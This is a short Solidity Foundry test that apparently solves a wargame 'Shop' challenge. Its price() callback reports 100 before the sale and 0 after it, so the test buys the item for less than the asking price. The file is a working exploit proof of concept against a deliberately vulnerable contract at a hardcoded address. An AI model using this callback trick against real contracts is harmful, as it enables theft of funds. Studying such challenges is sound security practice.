// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Shop} from "../src/Shop.sol";

contract ShopTest is Test {
    Shop public shop;
    
    address addr = 0x5B646dd619eafeD3d95578Cc0AAaD3BF99134069;

    function price() external view returns (uint) {
        return shop.isSold() ? 0 : 100;
    }

    function setUp() public {
        shop = Shop(addr);
    }

    function testAttack() public {
        console.log(shop.price());
        shop.buy();
        assertTrue(shop.isSold());
        assertTrue(shop.price() < 100);
    }
}
